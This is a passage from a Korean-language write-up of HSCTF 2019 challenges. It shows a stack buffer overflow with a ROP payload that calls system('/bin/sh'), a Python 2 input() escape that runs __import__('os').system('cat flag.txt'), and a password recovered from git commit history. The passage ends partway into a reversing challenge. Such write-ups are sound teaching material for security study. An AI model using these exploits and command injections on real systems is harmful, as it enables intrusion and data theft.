+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
+        <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">8</span>];
+        printf(<span style="color:#e6db74">&#34;Here&#39;s your free computer: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, system);
+        printf(<span style="color:#e6db74">&#34;Dude you hear about that new game called /bin/sh&#34;</span>);
+        printf(<span style="color:#e6db74">&#34;? Enter the right combo for some COMBO CARNAGE!: &#34;</span>);
+        gets(dest);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+        setbuf(stdout, NULL);
+        gid_t gid <span style="color:#f92672">=</span> getegid();
+        setresgid(gid,gid,gid);
+        vuln();
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></td></tr></table>
+</div>
+</div>
+10번째 줄의 gets()에서 BOF 취약점이 발생합니다.
+지역변수 dest부터 리턴 주소까지의 거리를 바이너리를 통해 확인합니다.</p>
+
+<pre><code class="language-c">int vuln()
+{
+  char v1; // [sp+8h] [bp-8h]@1
+
+  printf(&quot;Here's your free computer: %p\n&quot;, &amp;system);
+  printf(&quot;Dude you hear about that new game called /bin/sh&quot;);
+  printf(&quot;? Enter the right combo for some COMBO CARNAGE!: &quot;);
+  return gets(&amp;v1);
+}
+</code></pre>
+
+<p>3번째 줄에 지역변수 v1은 bp-8에 위치하므로 리턴 주소까지의 거리는 sfp 8 바이트를 더해서 0x10입니다.</p>
+
+<pre><code class="language-c">+---------+--------+--------+
+| dest[8] | sfp[8] | ret[8] |
++---------+--------+--------+
+</code></pre>
+
+<p>다음으로 리턴 주소에 무엇을 넣을지 정해야합니다. 소스코드 7번째 줄에 보이듯이 system의 주소를 일부로 보여주고 있었습니다. 다음은 nc로 접속했을 때입니다.</p>
+
+<pre><code class="language-shell"># nc pwn.hsctf.com 3131
+Here's your free computer: 0x7f8c5880f390
+Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
+</code></pre>
+
+<p>파이썬 코딩으로 system 주소를 파싱하여 가져옵니다.</p>
+
+<pre><code class="language-python">r.recvuntil(': ')
+system = int(r.recvline(), 16)
+</code></pre>
+
+<p>그리고 <code>/bin/sh</code>를 system() 함수에 매개변수로 넘겨준다. 문자열은 소스코드 8번째 줄에 나와있다.</p>
+
+<pre><code class="language-python">e = ELF('./combo-chain-lite')
+binsh = next(e.search('/bin/sh'))
+</code></pre>
+
+<p><code>/bin/sh</code>를 매개변수로 전달하려고보니.. 이번 문제는 ELF64 바이너리였다.</p>
+
+<pre><code>[*] '/mnt/hgfs/shared/hsctf/combo-chain-lite'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+
+<p>함수 호출 규약 fastcall에 따라 첫 번재 매개변수는 rdi에 넣어줘야 합니다.
+가젯을 이용합니다.</p>
+
+<pre><code class="language-python">rop = ROP(e)
+payload += 'a' * 0x10
+payload += p64(rop.rdi.address)
+payload += p64(binsh)
+payload += p64(system)
+</code></pre>
+
+<pre><code class="language-shell">$ cat flag
+hsctf{wheeeeeee_that_was_fun}
+</code></pre>
+
+<h1 id="miscellaneous-index"><a href="#index">Miscellaneous</a></h1>
+
+<h2 id="a-simple-conversation-index"><a href="#index">A Simple Conversation</a></h2>
+
+<pre><code class="language-diff">A Simple Conversation
+178
+Miscellaneous cppio
+Written by: cppio
+
+Someone on the internet wants to talk to you. Can you find out what they want?
+
+nc misc.hsctf.com 9001
+</code></pre>
+
+<pre><code class="language-shell"># nc misc.hsctf.com 9001
+Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt;
+</code></pre>
+
+<p>20살 나이를 적으면</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; 20
+Wow!
+Sometimes I wish I was 20
+Well, it was nice meeting you, 20-year-old.
+Goodbye!
+</code></pre>
+
+<p>입력한 <code>20</code>을 그대로 출력해준다.<br />
+<code>talk.py</code>도 제공해주고 있으므로 확인해보자.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from time import sleep
+
+print(&quot;Hello!&quot;)
+
+sleep(1)
+
+print(&quot;Hey, can you help me out real quick.&quot;)
+
+sleep(1)
+
+print(&quot;I need to know your age.&quot;)
+
+sleep(1)
+
+print(&quot;What's your age?&quot;)
+
+age = input(&quot;&gt; &quot;)
+
+sleep(1)
+
+print(&quot;Wow!&quot;)
+
+sleep(1)
+
+print(&quot;Sometimes I wish I was %s&quot; % age)
+
+sleep(1)
+
+print(&quot;Well, it was nice meeting you, %s-year-old.&quot; % age)
+
+sleep(1)
+
+print(&quot;Goodbye!&quot;)
+</code></pre>
+
+<p>python3로 돌아가고 나이를 <code>%s</code> 문자열로 출력해준다.<br />
+호기심에 문자열 아무거나 넣어보았다.</p>
+
+<pre><code class="language-shell"># nc misc.hsctf.com 9001
+Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; lakwjefoiawejf
+Traceback (most recent call last):
+  File &quot;talk.py&quot;, line 18, in &lt;module&gt;
+    age = input(&quot;&gt; &quot;)
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+NameError: name 'lakwjefoiawejf' is not defined
+</code></pre>
+
+<p>뚜둥! <code>NameError</code>가 뜨는 것으로보아 선언되어있는 변수이름을 알면 뭐든 출력할 수 있을 것 같다.
+<code>talk.py</code> 안에 flag가 있는거 같진 않아보인다.
+<code>python jailbreak</code>를 검색해보면 <code>dir()</code>에 대한 글을 어렵지 않게 볼 수 있다.
+해당 명령으로 선언되어있는 변수를 확인할 수 있는 듯 하다.</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; dir()
+Wow!
+Sometimes I wish I was ['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'sleep']
+Well, it was nice meeting you, ['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'sleep']-year-old.
+Goodbye!
+</code></pre>
+
+<p>다양한 녀석들이 나오는데 이 중에 <code>__builtins__</code>에 주목했다.</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; dir(__builtins__)
+Wow!
+Sometimes I wish I was ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
+Well, it was nice meeting you, ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']-year-old.
+Goodbye!
+</code></pre>
+
+<p>우리가 사용할 수 있는 것들 중에 <code>__import__</code>가 눈에 띈다.
+<code>os</code> 모듈을 임포트한 다음에 system 함수로 디렉토리를 확인해보자.</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; __import__('os').system('ls')
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+talk.py
+tmp
+usr
+var
+Wow!
+Sometimes I wish I was 0
+Well, it was nice meeting you, 0-year-old.
+Goodbye!
+</code></pre>
+
+<p><code>flag.txt</code>가 확인됬다.
+플래그는 다음과 같다.</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; __import__('os').system('cat flag.txt')
+hsctf{plz_u5e_pyth0n_3}
+Wow!
+Sometimes I wish I was 0
+Well, it was nice meeting you, 0-year-old.
+Goodbye!
+</code></pre>
+
+<p>또는 파일이름을 모르는 상태에서는 불가능하지만, 안다는 가정 하에 빌트인 함수인 <code>execfile</code>도 가능하겠다 싶었다.</p>
+
+<pre><code class="language-shell">Hello!
+Hey, can you help me out real quick.
+I need to know your age.
+What's your age?
+&gt; execfile('flag.txt')
+Traceback (most recent call last):
+  File &quot;talk.py&quot;, line 18, in &lt;module&gt;
+    age = input(&quot;&gt; &quot;)
+  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;
+  File &quot;flag.txt&quot;, line 1
+    hsctf{plz_u5e_pyth0n_3}
+         ^
+SyntaxError: invalid syntax
+</code></pre>
+
+<p><code>execfile</code>은 line 1에서 에러가 나면 line 2부터는 내용을 읽지 않는다는 단점이 있긴 하다.</p>
+
+<h2 id="admin-pass-index"><a href="#index">Admin Pass</a></h2>
+
+<p><code>#git</code>, <code>#log</code>, <code>#history</code></p>
+
+<pre><code class="language-diff">Admin Pass
+142
+Written by: Weastie
+
+Hey guys, found a super cool website at http://misc.hsctf.com:8001!
+
+Edit: If the site is blocked by school filters, try
+
+http://misc.hsctf.com or http://misc.hsctf.com:8080; both will work!
+</code></pre>
+
+<p>멋진 웹사이트를 발견했단다 들어가보자.</p>
+
+<p><img src="https://user-images.githubusercontent.com/19237789/59142495-3ffec000-89fa-11e9-8626-42b51fb6f710.png" alt="coolWebsite" /></p>
+
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+
+&lt;<span style="color:#f92672">html</span>&gt;
+	&lt;<span style="color:#f92672">head</span>&gt;
+		<span style="color:#75715e">&lt;!-- IMPORTANT NOTE: THE FLAG IS NOT hsctf{literally_not_the_flag} --&gt;</span>
+		&lt;<span style="color:#f92672">title</span>&gt;admin password checker&lt;/<span style="color:#f92672">title</span>&gt;
+		&lt;<span style="color:#f92672">style</span>&gt;
+			<span style="color:#f92672">body</span> {
+				<span style="color:#66d9ef">background-color</span>: <span style="color:#66d9ef">purple</span>;
+			}
+<span style="color:#f92672">[</span><span style="color:#f92672">snip</span><span style="color:#f92672">]</span>
+		&lt;/<span style="color:#f92672">style</span>&gt;
+	&lt;/<span style="color:#f92672">head</span>&gt;
+	&lt;<span style="color:#f92672">body</span>&gt;
+		&lt;<span style="color:#f92672">h1</span>&gt; password checker &lt;/<span style="color:#f92672">h1</span>&gt;
+		&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;POST&#39;</span>&gt;
+			&lt;<span style="color:#f92672">h1</span>&gt; pls enter password here &lt;/<span style="color:#f92672">h1</span>&gt;
+			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text&#39;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span> /&gt;
+			&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;submit&#39;</span> /&gt;
+		&lt;/<span style="color:#f92672">form</span>&gt;
+		&lt;<span style="color:#f92672">hr</span>&gt;
+		&lt;<span style="color:#f92672">h1</span>&gt; as my tribute to richard michael stallman &lt;/<span style="color:#f92672">h1</span>&gt;
+		&lt;<span style="color:#f92672">h1</span>&gt; here is a link to the open source github &lt;/<span style="color:#f92672">h1</span>&gt;
+		&lt;<span style="color:#f92672">marquee</span> <span style="color:#a6e22e">scrolldelay</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span>&gt;
+			&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://gitlab.com/WeastieWeastie/admin-password/&#39;</span>&gt;https://gitlab.com/WeastieWeastie/admin-password/&lt;/<span style="color:#f92672">a</span>&gt;
+		&lt;/<span style="color:#f92672">marquee</span>&gt;
+	&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></td></tr></table>
+</div>
+</div>
+
+<p>25번째 줄을 보면 <code>gitlab.com/WeastieWeastie/admin-password/</code> 링크가 있다.</p>
+
+<p><img src="https://user-images.githubusercontent.com/19237789/59142534-b4396380-89fa-11e9-9251-0b09bbc1d00a.png" alt="gitlab" /></p>
+
+<p>40개의 Commit이 보이고 <code>index.php</code>가 보인다.</p>
+
+<p>git은 코드 형상관리를 해주는 도구로써 코드 수정한 기록을 볼 수 있다.
+먼저 <code>clone</code>을 해온 뒤 <code>log</code>를 본다.</p>
+
+<pre><code class="language-shell"># git clone https://gitlab.com/WeastieWeastie/admin-password.git
+# cd admin-password
+# git log
+commit 35e9ff76141be4dfbfb302a6849e7fd5222fdb27 (HEAD, origin/master, origin/HEAD, master)
+Author: Weastie Weastie &lt;ry.weast@gmail.com&gt;
+Date:   Tue May 28 22:39:55 2019 -0400
+
+    added some lines
+
+commit f2019b4e3a0581283ab9d79917cb2f8f3d29d3a0
+Author: Weastie Weastie &lt;ry.weast@gmail.com&gt;
+Date:   Tue May 28 22:39:49 2019 -0400
+
+    added some lines
+
+commit 65d12ae1990786502306063df130edfefd99152f
+Author: Weastie Weastie &lt;ry.weast@gmail.com&gt;
+Date:   Tue May 28 22:25:01 2019 -0400
+
+    added some lines
+
+commit 248adf9a2c36d3e979690b86cac27e772d9c1cde
+Author: Weastie Weastie &lt;ry.weast@gmail.com&gt;
+Date:   Tue May 28 22:24:29 2019 -0400
+
+    added some lines
+
+commit 01735386594cb9ca0558a8d216bb370d064b891c
+Author: Weastie Weastie &lt;ry.weast@gmail.com&gt;
+Date:   Tue May 28 22:23:48 2019 -0400
+
+    added some lines
+...
+</code></pre>
+
+<p>40개의 Commit 중에 flag가 있었다.</p>
+
+<pre><code class="language-shell"># git diff cd9101a58867eebf157e222097b317f20448e16c 08ad9151aed2f115eebd1b288823140e9c34ca0d 954f05ece6f8d686e33daabd3885ef76cd7db025 3fa5f2ad2f17bec15e4a45b747cced878b82c292 2f48a1b4b2eba922bca1e644b9a9d609cf08be77 ced3b4c6774184cddaa641a6091210a6242c889e 97223d2b79dff0227e863163163c2f6ee5f14631
+diff --cc index.php
+index 1ae0caf,7139a02,5cf73b3,84763ec,8c003a4,854d026..dd9a1f1
+--- a/index.php
++++ b/index.php
+@@@@@@@ -1,7 -1,7 -1,7 -1,7 -1,7 -1,7 +1,7 @@@@@@@
+      &lt;?php
+------  if ($_GET['password']) {
+----            if (md5($_GET['password']) === '6df4c2a41091d8c737db7a44e3d07fb3') {
+    -           if ($_GET['password'] === 'i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b') {
+     -          if ($_GET['password']) {
+------                  echo 'congrats the flag is hsctf{' . $_GET['password'] . '}';
+++++++  if ($_POST['password']) {
+++++++          if (md5($_POST['password']) === '6df4c2a41091d8c737db7a44e3d07fb3') {
+++++++                  echo 'congrats the flag is hsctf{' . $_POST['password'] . '}';
+                }
+                echo 'oh hi you entered a password';
+        }
+@@@@@@@ -17,10 -17,9 -17,5 -15,5 -15,5 -17,5 +17,10 @@@@@@@
+        &lt;/head&gt;
+        &lt;body&gt;
+                &lt;h1&gt; paswrord cchekcer &lt;/h1&gt;
+  ++++          &lt;form method='POST'&gt;
+  ++++                  &lt;h1&gt; pls ernter passwrd here &lt;/h1&gt;
+  ++++                  &lt;input type='text' name='password' placeholder='password' /&gt;
+ +++++                  &lt;input type='submit'&gt;
+  ++++          &lt;/form&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+</code></pre>
+
+<p>flag : <code>hsctf{i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b}</code><br />
+소스코드 형상관리를 git을 사용하는 기업이나 개인 개발자들 중에서 이와 같은 방식으로 DB 계정을 털리기도 한다.</p>
+
+<h1 id="reversal-index"><a href="#index">Reversal</a></h1>
+
+<h2 id="a-byte-index"><a href="#index">A Byte</a></h2>
+
+<pre><code class="language-diff">A Byte
+201
+Written by: ItzSomebody
+
+Just one byte makes all the difference.
+
+ab6582abc8979f562a7318cb1e0a7293  a-byte
+</code></pre>
+
+<p>&lsquo;단 1 바이트만으로 모든게 달라진다.&lsquo;라면서 a-byte라는 바이너리를 줍니다.</p>
+
+<pre><code class="language-shell"># file a-byte
+a-byte: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=88fe0ee8aed1a070d6555c7e9866e364a40f686c, stripped
+</code></pre>
+
+<p>ELF 64-bit 바이너리입니다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
